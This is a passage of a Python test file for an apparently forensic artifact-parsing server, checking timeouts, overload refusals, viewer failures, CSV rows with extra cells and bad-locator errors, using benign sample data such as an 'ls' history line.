    worker,  # noqa: F811
    tmp_path,
    monkeypatch,
):
    server, base = worker
    data = b"ls\n"
    name = hashlib.sha256(data).hexdigest() + ".bin"
    call(base, "PUT", f"/files/{name}", raw=data)
    asked = {"name": name, "parser": "history", "source": "bash", "loc": {"line": 1, "offset": 0, "length": 3}}
    sleeper = _viewer(tmp_path, "import time\ntime.sleep(30)\n")
    flood = _viewer(tmp_path, "print('{\"x\": \"' + 'a' * (600 * 1024) + '\"}')\n")
    failing = _viewer(tmp_path, "import sys\nsys.exit(7)\n")
    with monkeypatch.context() as patch:  # a viewer that sleeps, and a clock of one second
        patch.setattr(server, "VIEWER", sleeper)
        patch.setattr(server, "VIEW_SECONDS", 1)
        assert call(base, "POST", "/view", asked)[0] == 504
    with monkeypatch.context() as patch:  # a viewer that prints more than the worker sends
        patch.setattr(server, "VIEWER", flood)
        assert call(base, "POST", "/view", asked)[0] == 502
    with monkeypatch.context() as patch:  # a viewer that fails
        patch.setattr(server, "VIEWER", failing)
        assert call(base, "POST", "/view", asked)[0] == 500
    # Every slot taken: the next view is refused, not queued.
    taken = [server._view_slots.acquire(blocking=False) for _ in range(server.VIEW_SLOTS)]
    try:
        assert all(taken) and call(base, "POST", "/view", asked)[0] == 503
    finally:
        for _ in taken:
            server._view_slots.release()
    assert call(base, "POST", "/view", asked)[0] == 200


def test_a_view_is_not_held_up_by_the_parses_that_fill_the_slots(worker):  # noqa: F811
    server, base = worker
    data = b"ls\n"
    name = hashlib.sha256(data).hexdigest() + ".bin"
    call(base, "PUT", f"/files/{name}", raw=data)
    taken = [server._slots.acquire(blocking=False) for _ in range(server.MAX_JOBS)]
    try:
        asked = {"name": name, "parser": "history", "source": "bash", "loc": {"line": 1, "offset": 0, "length": 3}}
        assert call(base, "POST", "/view", asked)[0] == 200
        assert call(base, "POST", "/parse", {"name": name, "fileName": ".bash_history"})[0] == 503
    finally:
        for _ in taken:
            server._slots.release()


def test_a_csv_row_with_more_cells_than_the_header_is_kept_in_the_browser_and_the_endpoint_parsers(tmp_path):
    sheet = write(tmp_path, "history.csv", "url,title\nhttps://a.example/,A,x,y\nhttps://b.example/,B\n")
    found = parse(browser, sheet, "chrome.csv")
    one, two = records(found)
    assert one["data"]["extra"] == ["x", "y"] and "extra" not in two["data"]
    assert [(n["reason"], n["count"]) for n in found if n["t"] == "note"][0] == (
        "row with more cells than the header",
        1,
    )
    assert not [e for e in found if e["t"] == "skip"]
    table = write(tmp_path, "w.csv", "name,command\na,b,c,d\nd,e\n")
    found = parse(endpoint, table, "linux.persistence.systemd")
    one, two = records(found)
    assert one["data"]["extra"] == ["c", "d"] and one["data"]["command"] == "b" and "extra" not in two["data"]
    assert (one["loc"], two["loc"]) == ({"row": 1}, {"row": 2})


def test_a_locator_without_a_member_is_a_bad_locator_and_a_missing_place_is_not(tmp_path):
    path = write(tmp_path, ".bash_history", "ls\n")
    for call_ in (
        lambda: history.view(path, "bash", {"line": 1, "offset": 0}),
        lambda: browser.view(path, "chrome.history", {}),
        lambda: evtx.view(ev.SAMPLE, "evtx", {}),
        lambda: viewing.sqlite_row(path, "t", None),
    ):
        with pytest.raises(BadLocator):
            call_()
    with pytest.raises(ViewError) as error:
        history.view(path, "bash", {"line": 1, "offset": 99, "length": 3})
    assert not isinstance(error.value, BadLocator)
